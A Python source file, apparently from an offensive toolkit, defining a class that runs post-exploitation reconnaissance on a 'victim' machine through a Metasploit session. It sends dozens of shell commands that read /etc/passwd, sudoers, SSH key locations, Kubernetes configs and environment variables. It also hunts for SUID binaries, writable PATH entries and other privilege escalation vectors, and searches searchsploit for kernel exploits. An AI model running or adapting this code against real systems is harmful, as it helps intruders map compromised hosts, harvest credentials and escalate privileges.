import re
import shlex
import subprocess
import time
from nemesys.utils.logger import nemesysLogger
import datetime

class SystemEnumerator:
    """
    A class responsible for enumerating and gathering system information from a compromised machine.

    This class performs various enumeration tasks to gather critical system details, such as OS version,
    kernel vulnerabilities, running services, network configurations, file permissions, and more.
    It interacts with the system via commands executed over a session, logging the results for later analysis.

    Attributes:
        client: The Metasploit client instance used to interact with the victim system.
        timeout: Timeout duration for waiting for command execution results (in seconds).
    """

    def __init__(self, client, timeout=10):
        """
        Initializes the SystemEnumerator class.

        Args:
            client (object): The Metasploit client instance used to interact with the victim system.
            timeout (int): The timeout for waiting for commands to execute (default is 30 seconds).
        """
        self.client = client
        self.timeout = timeout

    def enumerate_system(self, session_id):
        """
        Performs the enumeration of the victim's system by running various commands to gather critical 
        system information.

        This method logs the results of each enumeration task into a timestamped log file to avoid overwriting.

        Args:
            session_id (str): The session ID for the active Metasploit session.
        """
        nemesysLogger.info("💀 Starting system enumeration...")

        # Generate a filename with timestamp to avoid conflicts
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        log_filename = f"system_enumeration_{timestamp}.log"

        # Open the log file to store command outputs
        with open(log_filename, "a") as log_file:
            # Run specific enumeration tasks
            self._enumerate_os_and_kernel(session_id, log_file)
            self._enumerate_kernel_vulnerabilities(session_id, log_file)
            self._enumerate_permissions_and_configs(session_id, log_file)
            self._inspect_running_services(session_id, log_file)
            self._check_network_configs(session_id, log_file)
            self._inspect_config_files(session_id, log_file)
            self._evaluate_insecure_binaries(session_id, log_file)
            self._identify_elevated_accounts(session_id, log_file)
            self._scan_for_malware(session_id, log_file)
            self._inspect_system_logs(session_id, log_file)
            self._check_installed_packages(session_id, log_file)
            self._check_selinux_apparmor(session_id, log_file)
            nemesysLogger.info(f"💀 System enumeration complete ✅ (Results saved in {log_filename})")

    def _enumerate_os_and_kernel(self, session_id, log_file):
        """
        Enumerates the operating system, kernel version, and system details of the victim machine.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("🖥️ Starting enumeration of OS, Kernel, and system details...")

        # Enumerating system information using a set of reliable commands
        self._run_command(session_id, "uname -a", log_file)  # General system information
        self._run_command(session_id, "uname -r", log_file)  # Kernel version
        self._run_command(session_id, "lsb_release -a", log_file)  # Distribution details
        self._run_command(session_id, "cat /etc/os-release", log_file)  # Detailed OS release information
        self._run_command(session_id, "hostnamectl", log_file)  # Host and system architecture details
        self._run_command(session_id, "dmesg | grep -i 'linux version'", log_file)  # Kernel version from system logs
        self._run_command(session_id, "cat /proc/version", log_file)  # Kernel version and compilation info
        self._run_command(session_id, "uptime", log_file)  # System uptime
        self._run_command(session_id, "ps aux --sort=-%mem", log_file)  # Processes sorted by memory usage for post-exploitation

        nemesysLogger.info("🖥️ OS, Kernel, and system enumeration complete ✅")


    def _enumerate_kernel_vulnerabilities(self, session_id, log_file):
        """
        Identifies potential kernel vulnerabilities based on the current kernel version.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("🔍 Identifying kernel vulnerabilities...")
        kernel_version_output = self._run_command(session_id, "cat /proc/version", log_file)
        if kernel_version_output:
            kernel_version = kernel_version_output.strip()
            nemesysLogger.info(f"Kernel version: {kernel_version}")
            self._search_kernel_vulnerabilities(kernel_version, log_file)
        else:
            nemesysLogger.warning("❌ Failed to retrieve kernel version from /proc/version")
        
        nemesysLogger.info("🔍 Kernel vulnerability identification complete ✅")

    def _enumerate_permissions_and_configs(self, session_id, log_file):
        """
        Enumerates sensitive permissions, configurations, and potential privilege escalation vectors.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("🔍 Analyzing system permissions and configurations...")

        # Get current user information
        self._run_command(session_id, "id", log_file)
        # Verify the current username
        self._run_command(session_id, "whoami", log_file)
        # Check system user accounts
        self._run_command(session_id, "cat /etc/passwd", log_file)
        # Check system groups
        self._run_command(session_id, "cat /etc/group", log_file)
        # Retrieve user accounts using 'getent'
        self._run_command(session_id, "getent passwd", log_file)
        # Retrieve system groups using 'getent'
        self._run_command(session_id, "getent group", log_file)
        # Analyze sudoers configuration for privileged commands
        self._run_command(session_id, "cat /etc/sudoers", log_file)
        # List available sudo privileges for the current user
        self._run_command(session_id, "sudo -l", log_file)
        # Search for files with SUID permissions (potential privilege escalation)
        self._run_command(session_id, "find / -perm -4000 -type f 2>/dev/null", log_file)
        # Search for files with SGID permissions (potential privilege escalation)
        self._run_command(session_id, "find / -perm -2000 -type f 2>/dev/null", log_file)
        # Check SSH configurations for potential credential leaks
        self._run_command(session_id, "ls -la /home/*/.ssh/", log_file)
        # List all environment variables
        self._run_command(session_id, "env", log_file)
        # Check the default file permission mask
        self._run_command(session_id, "umask", log_file)
        # Display disk usage information
        self._run_command(session_id, "df -h", log_file)
        # List mounted file systems
        self._run_command(session_id, "mount", log_file)

        nemesysLogger.info("🔍 System permissions and configurations analysis complete ✅")

    def _inspect_running_services(self, session_id, log_file):
        """
        Inspects running processes, services, and network connections.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("🔎 Analyzing running processes, services, and network connections...")

        # List processes sorted by memory usage
        self._run_command(session_id, "ps aux --sort=-%mem", log_file)
        # List processes sorted by CPU usage
        self._run_command(session_id, "ps aux --sort=-%cpu", log_file)
        # Capture a snapshot of top processes
        self._run_command(session_id, "top -b -n 1 | head -20", log_file)
        # Display listening network services (using netstat)
        self._run_command(session_id, "netstat -tulnp", log_file)
        # Display listening network services (using ss)
        self._run_command(session_id, "ss -tulnp", log_file)
        # List open files and network connections
        self._run_command(session_id, "lsof -i", log_file)
        # List active services (systemd)
        self._run_command(session_id, "systemctl list-units --type=service", log_file)
        # Check the status of all services
        self._run_command(session_id, "service --status-all", log_file)
        # List service configurations (chkconfig)
        self._run_command(session_id, "chkconfig --list", log_file)
        # Display user cron jobs
        self._run_command(session_id, "crontab -l", log_file)
        # Display system-wide cron jobs
        self._run_command(session_id, "cat /etc/crontab", log_file)
        # List scheduled tasks across cron directories
        self._run_command(session_id, "ls -la /etc/cron.* /var/spool/cron/crontabs", log_file)

        nemesysLogger.info("🔎 Analysis of running processes and services complete ✅")


    def _check_network_configs(self, session_id, log_file):
        """
        Checks detailed network configuration, including IP addresses, routing tables, interfaces, and DNS settings.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("🌐 Analyzing network configuration details...")

        # Display network interface configurations (legacy tool)
        self._run_command(session_id, "ifconfig", log_file)
        # Display network interface details (modern command)
        self._run_command(session_id, "ip a", log_file)
        # Display IP routing table
        self._run_command(session_id, "ip route", log_file)
        # Display default gateway information
        self._run_command(session_id, "route -n", log_file)
        # Display active network connections
        self._run_command(session_id, "netstat -rn", log_file)
        # List all active connections and listening ports
        self._run_command(session_id, "ss -tunlp", log_file)
        # Display DNS resolver configurations
        self._run_command(session_id, "cat /etc/resolv.conf", log_file)
        # Show hostname and domain information
        self._run_command(session_id, "hostnamectl", log_file)
        # Check network status (systemd-based systems)
        self._run_command(session_id, "systemctl status network", log_file)
        # Display firewall rules (iptables)
        self._run_command(session_id, "iptables -L -v -n", log_file)
        # Display firewall rules (nftables)
        self._run_command(session_id, "nft list ruleset", log_file)

        nemesysLogger.info("🌐 Network configuration analysis complete ✅")


    def _inspect_config_files(self, session_id, log_file):
        """
        Inspects critical system configuration files for sensitive information and potential misconfigurations.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("🛠️ Analyzing critical configuration files for potential issues...")

        # Check SSH server configuration for potential vulnerabilities
        self._run_command(session_id, "cat /etc/ssh/sshd_config", log_file)
        # Check SSH client configuration
        self._run_command(session_id, "cat /etc/ssh/ssh_config", log_file)
        # Check MySQL database server configuration
        self._run_command(session_id, "cat /etc/mysql/my.cnf", log_file)
        # Check Apache web server configuration
        self._run_command(session_id, "cat /etc/apache2/apache2.conf", log_file)
        # Check Nginx web server configuration
        self._run_command(session_id, "cat /etc/nginx/nginx.conf", log_file)
        # Inspect PHP configuration for sensitive directives
        self._run_command(session_id, "cat /etc/php/*/apache2/php.ini", log_file)
        # Check PostgreSQL database server configuration
        self._run_command(session_id, "cat /etc/postgresql/*/main/postgresql.conf", log_file)
        # Check Docker daemon configuration
        self._run_command(session_id, "cat /etc/docker/daemon.json", log_file)
        # Inspect Kubernetes configuration
        self._run_command(session_id, "cat ~/.kube/config", log_file)
        # Display environment variables in system startup files
        self._run_command(session_id, "cat /etc/environment", log_file)
        # Inspect system-wide profile settings
        self._run_command(session_id, "cat /etc/profile", log_file)
        # Inspect sudoers file for privilege issues
        self._run_command(session_id, "cat /etc/sudoers", log_file)
        # Check cron jobs for potential backdoors
        self._run_command(session_id, "cat /etc/crontab", log_file)

        nemesysLogger.info("🛠️ Critical configuration files analysis complete ✅")

    def _evaluate_insecure_binaries(self, session_id, log_file):
        """
        Evaluates potentially insecure binaries or scripts that may lead to privilege escalation.
        This includes searching for world-writable scripts, binaries with SUID/SGID bits set, and misconfigured executables.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("⚠️ Searching for insecure binaries and scripts...")

        # Find world-writable shell scripts, which could be modified for privilege escalation
        self._run_command(session_id, "find / -type f -name '*.sh' -perm -o=w 2>/dev/null", log_file)
        # Find binaries with the SUID bit set (potential privilege escalation vector)
        self._run_command(session_id, "find / -perm -4000 -type f 2>/dev/null", log_file)
        # Find binaries with the SGID bit set (potential for privilege escalation via group permissions)
        self._run_command(session_id, "find / -perm -2000 -type f 2>/dev/null", log_file)
        # Check for writable directories in the PATH environment variable
        self._run_command(session_id, "echo $PATH | tr ':' '\n' | xargs -I{} find {} -maxdepth 1 -perm -o=w 2>/dev/null", log_file)
        # Search for unquoted service paths in systemd services (potential path hijacking)
        self._run_command(session_id, "grep -R 'ExecStart=' /etc/systemd/system/ | grep -v '\"'", log_file)
        # Check for writable or unsafe cron jobs
        self._run_command(session_id, "find /etc/cron* -type f -perm -o=w 2>/dev/null", log_file)

        nemesysLogger.info("⚠️ Insecure binaries and scripts evaluation complete ✅")


    def _identify_elevated_accounts(self, session_id, log_file):
        """
        Identifies elevated accounts with root or administrative privileges, and checks for potential privilege escalation paths.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("👑 Identifying accounts with elevated privileges...")

        # Display contents of the sudoers file to check for users with sudo permissions
        self._run_command(session_id, "cat /etc/sudoers", log_file)
        # List users belonging to the sudo, admin, or wheel groups (common for elevated privileges)
        self._run_command(session_id, "getent group sudo admin wheel", log_file)
        # Check for users with UID 0 (equivalent to root)
        self._run_command(session_id, "getent passwd | awk -F: '$3 == 0 {print $1}'", log_file)
        # Search for users with NOPASSWD in the sudoers file (potential privilege escalation risk)
        self._run_command(session_id, "grep -E '(ALL|NOPASSWD)' /etc/sudoers /etc/sudoers.d/* 2>/dev/null", log_file)
        # Identify accounts with login shells that might indicate active administrative users
        self._run_command(session_id, "getent passwd | awk -F: '$7 != \"/usr/sbin/nologin\" && $7 != \"/bin/false\"'", log_file)
        # Check for SSH keys that could allow root or administrative access
        self._run_command(session_id, "find /root /home -name 'authorized_keys' -type f 2>/dev/null", log_file)

        nemesysLogger.info("👑 Elevated accounts identification complete ✅")


    def _scan_for_malware(self, session_id, log_file):
        """
        Scans the system for potential malware or suspicious files and processes.
        This includes searching for temporary files, known malware patterns, and unusual hidden files or directories.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("💣 Scanning the system for malware and suspicious files...")

        # Search for temporary files and suspicious executables
        self._run_command(session_id, "find / -type f \\( -name '*.tmp' -o -name '*.exe' -o -name '*.scr' -o -name '*.bat' \\) 2>/dev/null", log_file)
        # Look for common malware signatures or processes running with suspicious names
        self._run_command(session_id, "ps aux | grep -iE 'malware|trojan|virus|cryptominer|backdoor'", log_file)
        # Search for hidden files and directories (often used by malware)
        self._run_command(session_id, "find / -type f -name '.*' -o -type d -name '.*' 2>/dev/null", log_file)
        # Check for recently modified files (could indicate malware activity)
        self._run_command(session_id, "find / -type f -mtime -1 2>/dev/null", log_file)
        # Search for known malicious cron jobs
        self._run_command(session_id, "crontab -l | grep -iE 'curl|wget|nc|bash'", log_file)
        # Look for unusual startup scripts or unauthorized systemd services
        self._run_command(session_id, "systemctl list-unit-files | grep enabled | grep -iE 'backdoor|malware'", log_file)

        nemesysLogger.info("💣 Malware scanning and analysis complete ✅")


    def _inspect_system_logs(self, session_id, log_file):
        """
        Inspects key system logs for signs of suspicious activities, such as failed login attempts,
        unauthorized access, or unexpected system changes.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("📜 Analyzing system logs for suspicious activities...")

        # Check for failed login attempts in the authentication log
        self._run_command(session_id, "grep 'Failed password' /var/log/auth.log", log_file)
        # Search for unusual sudo access or privilege escalation attempts
        self._run_command(session_id, "grep 'sudo' /var/log/auth.log | grep -i 'session opened for user root'", log_file)
        # Inspect system logs for kernel errors or unexpected reboots
        self._run_command(session_id, "grep -i 'kernel' /var/log/syslog", log_file)
        # Look for signs of unauthorized file access or changes in audit logs (if enabled)
        self._run_command(session_id, "grep -i 'denied' /var/log/audit/audit.log", log_file)
        # Analyze logs for potential network intrusions or port scans
        self._run_command(session_id, "grep -iE 'port scan|nmap|masscan' /var/log/syslog", log_file)
        # Check logs for any execution of unusual or unexpected binaries
        self._run_command(session_id, "grep -iE 'exec|/tmp/' /var/log/syslog", log_file)

        nemesysLogger.info("📜 System logs inspection and analysis complete ✅")

    def _check_installed_packages(self, session_id, log_file):
        """
        Analyzes installed packages for potential vulnerabilities and outdated software.
        Includes checks for both Debian-based (dpkg) and Red Hat-based (rpm) systems, 
        and attempts to identify packages with known security issues.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("📦 Analyzing installed packages and software versions...")

        # List all installed packages on Debian-based systems
        self._run_command(session_id, "dpkg -l", log_file)
        # List all installed packages on Red Hat-based systems
        self._run_command(session_id, "rpm -qa", log_file)
        # Check for outdated packages on Debian-based systems
        self._run_command(session_id, "apt list --upgradable 2>/dev/null", log_file)
        # Check for outdated packages on Red Hat-based systems
        self._run_command(session_id, "yum check-update 2>/dev/null", log_file)
        # Search for packages with known vulnerabilities (if 'unattended-upgrades' is available)
        self._run_command(session_id, "grep -i 'CVE' /var/log/unattended-upgrades/unattended-upgrades.log", log_file)
        # Inspect package manager logs for recent installations or updates
        self._run_command(session_id, "cat /var/log/dpkg.log", log_file)
        self._run_command(session_id, "cat /var/log/yum.log", log_file)

        nemesysLogger.info("📦 Installed packages analysis complete ✅")


    def _check_selinux_apparmor(self, session_id, log_file):
        """
        Evaluates the status and configuration of SELinux and AppArmor.
        Checks whether these security modules are enabled and identifies potential misconfigurations.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info("🔐 Analyzing SELinux and AppArmor configurations...")

        # Check the current enforcement mode of SELinux
        self._run_command(session_id, "getenforce", log_file)
        # Display detailed SELinux status and policies
        self._run_command(session_id, "sestatus", log_file)
        # List all active SELinux policies (if SELinux is enabled)
        self._run_command(session_id, "semanage boolean -l", log_file)
        # Check the status of AppArmor
        self._run_command(session_id, "aa-status", log_file)
        # List all AppArmor profiles and their statuses
        self._run_command(session_id, "apparmor_status", log_file)
        # Inspect system logs for SELinux or AppArmor denials
        self._run_command(session_id, "grep 'SELinux' /var/log/audit/audit.log", log_file)
        self._run_command(session_id, "grep 'DENIED' /var/log/syslog", log_file)

        nemesysLogger.info("🔐 SELinux/AppArmor analysis complete ✅")

    def _search_kernel_vulnerabilities(self, kernel_version, log_file):
        """
        Searches for known kernel vulnerabilities based on the kernel version using `searchsploit`.

        Args:
            kernel_version (str): The kernel version to search vulnerabilities for.
            log_file (file object): The log file where command results will be saved.
        """
        nemesysLogger.info(f"🔍 Searching for kernel vulnerabilities for version: {kernel_version}...")
        cleaned_kernel_version = self._clean_kernel_version(kernel_version)
        if cleaned_kernel_version:
            search_query = f"linux kernel {cleaned_kernel_version}"
            try:
                result = self._run_searchsploit(search_query, log_file)
                if result:
                    nemesysLogger.info(f"🔍 searchsploit results for {search_query}:\n{result}")
            except Exception as e:
                nemesysLogger.error(f"❌ Failed to run searchsploit: {e}")
        else:
            nemesysLogger.warning("❌ Invalid or empty kernel version.")

    def _clean_kernel_version(self, kernel_version):
        """
        Cleans up the kernel version string to extract only the essential version part.

        Args:
            kernel_version (str): The raw kernel version string.

        Returns:
            str: The cleaned kernel version or None if no match is found.
        """
        match = re.match(r"Linux version ([0-9]+\.[0-9]+\.[0-9]+-[0-9]+)", kernel_version)
        if match:
            return match.group(1)
        else:
            return None

    def _run_searchsploit(self, query, log_file):
        """
        Runs the `searchsploit` command to find known exploits related to the provided query.

        Args:
            query (str): The query string to search for in `searchsploit`.
            log_file (file object): The log file where command results will be saved.

        Returns:
            str: The result of the `searchsploit` query.
        """
        try:
            command = f"searchsploit {query}"
            command_list = shlex.split(command)
            result = subprocess.check_output(command_list, stderr=subprocess.STDOUT)
            result = result.decode('utf-8')
            log_file.write(f"Executed command: {command}\n")
            log_file.write(f"Output: {result}\n\n")
            return result
        except subprocess.CalledProcessError as e:
            return None
        except Exception as e:
            return None

    def _run_command(self, session_id, command, log_file):
        """
        Runs a command on the victim machine and writes the output to the log file.

        Args:
            session_id (str): The session ID for the active Metasploit session.
            command (str): The command to execute on the victim machine.
            log_file (file object): The log file where command results will be saved.

        Returns:
            str: The output of the command execution.
        """
        shell = self.client.sessions.session(str(session_id))
        shell.write(command + '\n')
        time.sleep(self.timeout)
        output = shell.read()
        if output:
            log_file.write(f"Executed command: {command}\n")
            log_file.write(f"Output: {output}\n\n")
        return output